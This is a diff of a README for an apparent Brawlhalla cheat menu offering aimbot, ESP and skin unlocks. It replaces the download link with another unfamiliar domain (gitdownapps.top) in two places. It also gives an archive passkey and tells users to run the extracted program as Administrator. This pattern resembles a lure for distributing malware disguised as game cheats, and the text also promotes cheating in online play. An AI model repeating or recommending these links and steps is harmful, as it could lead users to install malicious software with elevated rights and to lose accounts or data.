@@ -6,7 +6,7 @@ Brawlhalla menu external with livemod, aimbot, ESP, hitbox viewer, unlock all sk
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **BrawlhallaHack**, **ExternalMenu**, and **QOLMod**
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Brawlhalla.
 4. Run the menu **as Administrator**.
